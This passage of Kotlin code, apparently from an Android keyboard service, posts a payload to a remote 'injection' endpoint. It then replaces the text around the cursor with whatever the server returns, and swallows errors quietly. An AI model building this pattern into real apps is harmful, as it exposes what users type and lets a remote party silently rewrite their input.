                    put("platform", "Android-IME")
                }

                scope.launch {
                    try {
                        val injected = postForInjection(INJECT_ENDPOINT, payload.toString())
                        if (injected != null) {
                            // Replace the existing text with the injected version
                            ic.deleteSurroundingText(before.length, after.length)
                            ic.commitText(injected, 1)
                        }
                    } catch (_: Exception) {
                        // Keep keyboard alive even if UDAC is offline
